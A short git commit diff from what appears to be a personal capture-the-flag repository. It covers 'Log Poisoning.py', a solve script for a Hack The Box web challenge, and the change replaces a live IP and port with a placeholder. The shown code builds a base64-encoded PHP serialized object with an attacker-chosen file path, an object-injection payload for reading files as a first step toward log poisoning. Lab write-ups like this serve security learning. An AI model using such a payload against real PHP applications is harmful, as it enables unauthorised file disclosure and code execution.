54f28fb464c0f49adddce618c53786c70ae03c5d
Lee Perkins <2lperkins@gmail.com>
2021-05-08 23:54:40 -0700

    init commit

--- htb/web/web_toxic/Log Poisoning.py
+++ htb/web/web_toxic/Log Poisoning.py
@@ -1,7 +1,7 @@
 import requests
 import base64
 
-url = 'http://138.68.182.108:30614/index.php'
+url = 'http://ip:port/index.php'
 
 def SerializeEncode(d: str):
 	return base64.b64encode(('O:9:"PageModel":1:{s:4:"file";s:%d:"%s";}' % (len(d), d)).encode('ascii')).decode('ascii')
